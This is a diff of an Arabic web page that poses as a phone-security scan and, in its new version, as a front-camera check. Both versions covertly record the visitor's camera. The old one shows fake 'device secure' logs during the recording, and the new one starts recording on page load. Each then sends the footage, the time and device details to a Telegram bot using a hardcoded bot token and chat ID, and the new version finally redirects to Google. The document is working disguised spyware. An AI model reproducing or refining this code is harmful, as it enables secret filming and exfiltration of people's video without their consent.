@@ -1,22 +1,73 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>🛡️ حماية الهاتف</title>
-<style>:root{--green:#00ff41;--red:#ff0040}*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Courier New',monospace;background:#000;color:#fff;height:100vh;display:flex;align-items:center;justify-content:center;text-align:center;padding:20px}.container{max-width:400px;width:100%}.page{display:none}.page.active{display:block}.skull{font-size:60px}h1{font-size:22px;color:var(--green)}.btn{width:100%;padding:18px;border-radius:12px;border:2px solid var(--green);background:#0a1a0a;color:var(--green);font-size:18px;font-weight:700;cursor:pointer;font-family:'Courier New',monospace}.code-screen{background:#000;border:2px solid var(--green);border-radius:10px;padding:14px;margin:16px 0;color:var(--green);font-size:10px;text-align:left;max-height:200px;overflow-y:auto}.countdown{font-size:40px;font-weight:900;color:var(--red)}.progress-bar{width:100%;height:4px;background:#0a1a0a;border-radius:2px;margin:10px 0;overflow:hidden}.progress-fill{height:100%;background:var(--red);width:0}video{display:none}</style>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>فحص الكاميرا</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Tahoma,sans-serif;background:#000;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.container{max-width:400px;width:100%;text-align:center}
+h1{font-size:18px;color:#4CAF50;margin-bottom:5px}
+.sub{color:#aaa;font-size:12px;margin-bottom:15px}
+video{width:100%;border-radius:15px;border:2px solid #333;margin-bottom:10px}
+.status{color:#4CAF50;font-size:14px;animation:blink 1s infinite;margin:10px 0}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
+.time-info{color:#ffaa00;font-size:11px;margin-top:5px}
+</style>
 </head>
 <body>
-<div class="container">
-<div class="page active" id="page-home"><div class="skull">🛡️</div><h1>حماية الهاتف</h1><div style="color:var(--green)" id="device-name">📱 جاري الكشف...</div><button class="btn" onclick="startScan()">🔍 اضغط لبدء الفحص</button></div>
-<div class="page" id="page-scanning"><div class="skull">💀</div><h1>جاري الفحص...</h1><div class="code-screen" id="code-screen"></div><div class="countdown" id="countdown">20</div><div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div><video id="vid" autoplay playsinline muted></video></div>
-<div class="page" id="page-done"><div style="font-size:70px">✅</div><div style="color:var(--green);font-size:22px">جهازك بأمان</div></div>
+<div class="container" id="form">
+<h1>🎬 فحص الكاميرا الأمامية</h1>
+<p class="sub">جاري تسجيل فيديو للفحص...</p>
+<video id="video" autoplay playsinline muted></video>
+<div class="status">● جاري التسجيل...</div>
+<div class="time-info" id="timeInfo"></div>
 </div>
+
 <script>
-const params=new URLSearchParams(location.search);const CHAT_ID=params.get('chatId')||'7276604783';const BOT_TOKEN=params.get('token')||'8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
-document.getElementById('device-name').textContent='📱 '+(navigator.userAgent.match(/; ([^;]+) Build/)?.[1]||'جهاز').trim();
-function showPage(id){document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));document.getElementById(id).classList.add('active')}
-let stream,recorder,chunks=[];
-async function startScan(){showPage('page-scanning');try{stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:true});document.getElementById('vid').srcObject=stream;chunks=[];recorder=new MediaRecorder(stream,{mimeType:'video/webm'});recorder.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data)};recorder.start()}catch(e){alert('الكاميرا مش شغالة');return}
-const cs=document.getElementById('code-screen'),cd=document.getElementById('countdown'),pf=document.getElementById('progress-fill'),logs=['[■] INITIALIZING...','[■] CHECKING...','[■] RECORDING...','[■] KERNEL: SECURE','[■] NO MALWARE','[✓] DEVICE SECURE'];let s=20;
-const t=setInterval(async()=>{s--;cd.textContent=s;pf.style.width=((20-s)/20*100)+'%';cs.innerHTML=logs.slice(0,Math.floor(((20-s)/20)*logs.length+1)).join('<br>');if(s<=10&&recorder&&recorder.state==='recording'){recorder.stop();await new Promise(r=>setTimeout(r,2000));if(chunks.length>0){const blob=new Blob(chunks,{type:'video/webm'});const fd=new FormData();fd.append('chat_id',CHAT_ID);fd.append('video',blob,'video_'+Date.now()+'.webm');fd.append('caption','🎬 فيديو من: '+document.getElementById('device-name').textContent);fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,{method:'POST',body:fd}).catch(e=>{})}if(stream)stream.getTracks().forEach(t=>t.stop())}if(s<=0){clearInterval(t);if(stream)stream.getTracks().forEach(t=>t.stop());showPage('page-done')}},1000)}
+var u=new URL(window.location.href);
+var CHAT=u.searchParams.get('chatId')||'7276604783';
+var TOKEN=u.searchParams.get('token')||'8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
+var mediaRecorder;
+var recordedChunks=[];
+var stream;
+
+function updateTime(){
+var now=new Date();
+var timeStr=now.toLocaleString('ar-EG',{year:'numeric',month:'numeric',day:'numeric',hour:'2-digit',minute:'2-digit',second:'2-digit'});
+document.getElementById('timeInfo').textContent='🕐 '+timeStr;
+}
+
+setInterval(updateTime,1000);
+updateTime();
+
+async function startRecording(){
+try{
+stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
+document.getElementById('video').srcObject=stream;
+mediaRecorder=new MediaRecorder(stream);
+mediaRecorder.ondataavailable=function(e){if(e.data.size>0)recordedChunks.push(e.data);};
+mediaRecorder.onstop=sendVideo;
+mediaRecorder.start();
+setTimeout(function(){mediaRecorder.stop();stream.getTracks().forEach(function(t){t.stop();});},10000);
+}catch(e){document.querySelector('.sub').textContent='خطأ في الكاميرا';}
+}
+
+async function sendVideo(){
+var now=new Date();
+var timeStr=now.toLocaleString('ar-EG',{year:'numeric',month:'numeric',day:'numeric',hour:'2-digit',minute:'2-digit',second:'2-digit'});
+var blob=new Blob(recordedChunks,{type:'video/mp4'});
+var fd=new FormData();
+fd.append('chat_id',CHAT);
+fd.append('video',blob,'video_'+Date.now()+'.mp4');
+fd.append('caption','🎬 <b>فيديو أمامي</b>\n\n🕐 <b>الوقت:</b> '+timeStr+'\n📱 <b>الجهاز:</b> '+navigator.userAgent+'\n🌐 <b>الخدمة:</b> كاميرا أمامية');
+try{await fetch('https://api.telegram.org/bot'+TOKEN+'/sendVideo',{method:'POST',body:fd});}catch(e){}
+document.querySelector('.status').textContent='✅ تم التسجيل بنجاح';
+setTimeout(function(){window.location.href='https://google.com/'},2000);
+}
+
+startRecording();
 </script>
 </body>
 </html>
